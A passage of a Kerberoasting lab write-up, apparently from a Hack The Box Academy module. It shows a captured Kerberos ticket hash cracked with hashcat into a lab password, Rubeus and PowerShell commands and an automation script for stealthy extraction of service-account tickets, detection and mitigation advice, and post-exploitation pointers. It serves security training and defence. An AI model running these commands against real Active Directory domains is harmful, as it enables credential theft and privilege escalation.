echo '$krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local@INLANEFREIGHT.LOCAL*$6F5B30F5AEF2CC451EF05F858D22A0C7$528519E555FD635CCE1FC3F60EDFF8249918716226B5F6BC3F7DB5239FE865A3607A962027CCB25446D108FE0978E1671CD9E4490C83DA4A5B0E7CCA4F2638E8E3C6C4E9FCF82A89B68D62618C4CE23E6210A5483D940D8E9924D6AF7A6D1173D5C773366E377E95A0EFE852FECC41831740F334B1AF96EFA980CD5DCB06ED4C4D7AFCE055E2055A16C3C40291F96CCC362CC3664237FFB1FB94160988A69BB07C68984EA94C8F54A76E4DE3FB77A8FCC85AF4AEF0C5BF549865E4E6054BC93F302CEF7B4AC8E453A8D68FBB3C3EF147830E0F9B50897CE5E18B6DD0D51F027F4F01AFFEF7F76FC51241143E9EF62782A98F77DBEE985F45C0B865946F9D27BD15B83E98781A17A934C68AE3A3E8F419FC9F7DFF049FF78DCD44F0C96757E3AC2EE5E34D5CC377AFD42E32D295C8C10804515B27D89E38DEED49F2854ABDDD01EB8B270A19F6AF4CC76C1A4D8101B771A43FA30CDC5399CDD10046090863383A82AF3A8C0D90B0D31BB89FF1B19956149C3D3C3DC4099B318F360DCF65337A8B291FC0B8A0A03B1CB12F3BB4C67D090BF8B16BF3C9EF5E70B7E714722FA65BC562D0F5737F50E1BA8F79C881B8ECC73129930A9D37DB8F339139DD8F9C26DBFDAF7C94A2F448C5251F243B4492C943A0FCA48B63A3DE244824CBF9607380869BD09ED400DB5E0AFC40699D6DE91C975EBCBC1BA8460361A79CA0BD39BE2974C4A8C44BD077D13E799A8CEE3D0136C183933EBEF4D11ADD28452C40593CBE3F56ED512826FAED80287EB643E7929E30E4813698E3F63CA794BAAAEC1DF832B60F9CA32A559C14F1F02EAD2A0C0191573E4BB2FBBB57CFA49AF073A9A2F67DD3C21026DDE9E10792D0CE091154365F808FF8A4C3D9E0FB8734B556C96C6BCB466C34832368C74955C4B8093CD593C51D491467818644AE8B1F30BD49529C489A9837BF80B18F3DC56E535553320250E3658F4814DD4F5E4780A526103857FDD95B386A820173CAE7217C7B3B88A3518DDECA172E2B665734DB079142717FBCAA1EC447312ECA0D4F5A17613364636C182C6BC316BDAAFB6C5B38020EA8A1CB2383FE884CB97808FF1FD1413F3871A8119D79095C47B309685E74915737E58FD8BB6D1E98A1344758CFFB20163D3A5E0FD414079657CE39C2751195D0E225714C6126E13C16E71731C610F42408B17623452C7C912EC1D738E6462463401A62629474F98FB0E0CB4B15082DA6DAB92A349907CC370BFD1EE7A3A7369287B6E33A05D141EE11B4539060622FD795B2E5F8AE687AB57FACD420475E251F7BFAE7EA1789033BA1B4D91F8FBB60A2EBB6917DF0B2E41FECC429A533983995CF5627C259FF0E4AE3C6ECD7574A94E32719E5BCD364D1EE7AD37DF688EFCE9F1D91371A86E6264D4CD776884389448EE2DAD1CDDC0B1390ECFC6EFCE6895838B0A7EC807AEAC52D422E284B6514A91D5721F9B22A6956FE8ACC76BC7FF89FB1C343B6EEDF17EAFBD1DFB4AC46518CFB9B16364639049356C6F3F1D56676B7B6358CF8AF21F0632B01DED739FF2F42B4C36BF87790E505C7CCD618A480EFE45485E5C4E253567E4206AB132180F1A5DF143097CE23D3C6CD05CAED17CFFFFF50F20FDAE44A3A445B781109B6EC012DD3FC4B885555FCF932BD13616FCA61' > hash.txt

# Crack with Hashcat (mode 13100 for Kerberos 5 TGS-REP)
sudo hashcat -m 13100 -w 3 -O hash.txt /usr/share/wordlists/rockyou.txt
```

**Actual Hashcat Cracking Results:**
```bash
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo hashcat -m 13100 -w 3 -O hash.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local@INLANEFREIGHT.LOCAL*$6f5b30f5aef2cc451ef05f858d22a0c7$...:Virtual01

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$vmwa...6fca61
Time.Started.....: [timestamp]
Time.Estimated...: [timestamp]
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Speed.#1.........: [speed] H/s
Recovered........: 1/1 (100.00%) Digests
Progress.........: [progress]/14344385
```

**✅ Answer: `Virtual01`**

**Key Lab Details:**
- **Service Account**: `svc_vmwaresso`
- **SPN**: `vmware/inlanefreight.local`
- **Encryption Type**: RC4_HMAC_DEFAULT (easy to crack)
- **Password**: `Virtual01` (found in rockyou.txt wordlist)
- **Hashcat Mode**: 13100 (Kerberos 5, etype 23, TGS-REP)

---

## 🔧 Advanced Windows Kerberoasting Techniques

### 🎯 **Stealth Considerations**
```cmd
# Use built-in tools to blend in
setspn.exe -Q */* > spn_enum.txt

# PowerShell native approach (no external tools)
Add-Type -AssemblyName System.IdentityModel
[System.IdentityModel.Tokens.KerberosRequestorSecurityToken]::new("TARGET_SPN")

# Rubeus with timing controls
.\Rubeus.exe kerberoast /delay:10000 /jitter:25 /nowrap

# Target specific high-value accounts only
.\Rubeus.exe kerberoast /ldapfilter:'(memberOf=*Domain Admins*)' /nowrap
```

### 🔍 **LDAP Filter Examples**
```cmd
# High-privilege accounts
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Accounts with passwords set long ago
.\Rubeus.exe kerberoast /pwdsetbefore:01-01-2020 /nowrap

# Specific service types
.\Rubeus.exe kerberoast /ldapfilter:'(servicePrincipalName=MSSQLSvc*)' /nowrap

# Exclude certain accounts
.\Rubeus.exe kerberoast /ldapfilter:'(!samAccountName=krbtgt)' /nowrap

# Combine multiple conditions
.\Rubeus.exe kerberoast /ldapfilter:'(&(admincount=1)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' /nowrap
```

### 🔄 **Automation Script Example**
```powershell
# Automated Kerberoasting script
$outputDir = "C:\temp\kerberoast"
New-Item -Path $outputDir -ItemType Directory -Force

# Enumerate SPNs
Write-Host "[+] Enumerating SPNs..."
$spnUsers = Get-DomainUser * -spn | Select-Object samaccountname,serviceprincipalname,memberof

# Target high-value accounts first
$highValue = $spnUsers | Where-Object {$_.memberof -match "Domain Admins|Enterprise Admins|Backup Operators"}

if ($highValue) {
    Write-Host "[!] Found high-value SPN accounts:"
    $highValue | ForEach-Object {
        Write-Host "  $($_.samaccountname) - $($_.serviceprincipalname)"
        
        # Extract ticket
        $ticket = Get-DomainUser -Identity $_.samaccountname | Get-DomainSPNTicket -Format Hashcat
        $ticket.Hash | Out-File "$outputDir\$($_.samaccountname)_hash.txt"
    }
}

# Extract all tickets
Write-Host "[+] Extracting all SPN tickets..."
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv "$outputDir\all_tickets.csv" -NoTypeInformation

Write-Host "[+] Results saved to: $outputDir"
```

---

## 🛡️ Mitigation and Detection

### 🔧 **Defensive Measures**
- **Managed Service Accounts (MSA/gMSA)**: Use accounts with automatically rotated complex passwords
- **Strong Passwords**: 25+ character passphrases for service accounts
- **Regular Rotation**: Frequent password changes for service accounts
- **Minimal Privileges**: Service accounts should not have unnecessary elevated rights
- **Remove RC4**: Disable RC4 encryption (test carefully for compatibility)

### 📊 **Detection Strategies**
```cmd
# Enable Kerberos auditing
# Group Policy: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options
# Enable: "Audit Kerberos Service Ticket Operations"

# Event IDs to monitor:
# 4769: A Kerberos service ticket was requested
# 4770: A Kerberos service ticket was renewed

# Detection criteria:
# - Large numbers of 4769 events from single account
# - Requests for RC4 tickets (encryption type 0x17)
# - Unusual service ticket requests outside business hours
# - Multiple service accounts targeted by same user
```

### 🔍 **Group Policy Configuration**
```cmd
# Disable RC4 encryption (caution: test thoroughly)
# Group Policy: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options
# "Network security: Configure encryption types allowed for Kerberos"
# Remove: RC4_HMAC_MD5, RC4_HMAC_DEFAULT
# Keep: AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
```

---

## ⚡ Quick Reference Commands

### 🔧 **Essential Windows Kerberoasting Workflow**
```cmd
# 1. Enumerate SPNs
setspn.exe -Q */*

# 2. PowerView enumeration
Get-DomainUser * -spn | select samaccountname,serviceprincipalname

# 3. Rubeus statistics
.\Rubeus.exe kerberoast /stats

# 4. Target high-value accounts
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# 5. Extract specific tickets
.\Rubeus.exe kerberoast /user:TARGET_USER /nowrap

# 6. Save all tickets
.\Rubeus.exe kerberoast /outfile:tickets.txt /nowrap
```

### 📊 **Tool Comparison Matrix**

| **Method** | **Stealth** | **Speed** | **Features** | **Requirements** |
|------------|-------------|-----------|--------------|------------------|
| **setspn + PowerShell + Mimikatz** | High | Slow | Manual control | Built-in tools |
| **PowerView** | Medium | Fast | Good filtering | PowerShell module |
| **Rubeus** | Low | Very Fast | Extensive features | External binary |

---

## 🔑 Key Takeaways

### ✅ **Windows Kerberoasting Advantages**
- **Multiple Approaches**: From manual to fully automated
- **Native Tool Integration**: Built-in Windows tools for stealth
- **Advanced Filtering**: Sophisticated targeting capabilities
- **Encryption Control**: Ability to manipulate ticket encryption types
- **Memory Access**: Direct ticket extraction from LSASS

### 🎯 **Strategic Considerations**
- **Encryption Types**: RC4 vs AES dramatically affects cracking time
- **Target Prioritization**: Focus on admincount=1 and Domain Admin group members
- **Stealth vs Speed**: Balance tool choice with detection risk
- **Environmental Factors**: Windows Server version affects encryption downgrade attacks

### ⚠️ **Operational Notes**
- **Windows Server 2019**: Encryption downgrade attacks don't work
- **AES vs RC4**: 4+ minutes vs 4 seconds cracking time difference
- **Detection Risk**: Rubeus generates more logs than manual methods
- **Timing Controls**: Use delay and jitter for stealth operations

### 🚀 **Post-Exploitation Opportunities**
- **SQL Server Access**: Use MSSQL service accounts for xp_cmdshell
- **RDP/WinRM Access**: Test cracked credentials across domain systems
- **File Share Access**: Service accounts often have broad file system rights
- **Additional SPNs**: Service accounts may have multiple SPNs registered

---

*Windows-based Kerberoasting provides the most comprehensive and feature-rich approach to this attack, offering everything from stealthy manual techniques to powerful automated frameworks that can extract and process tickets at scale.* 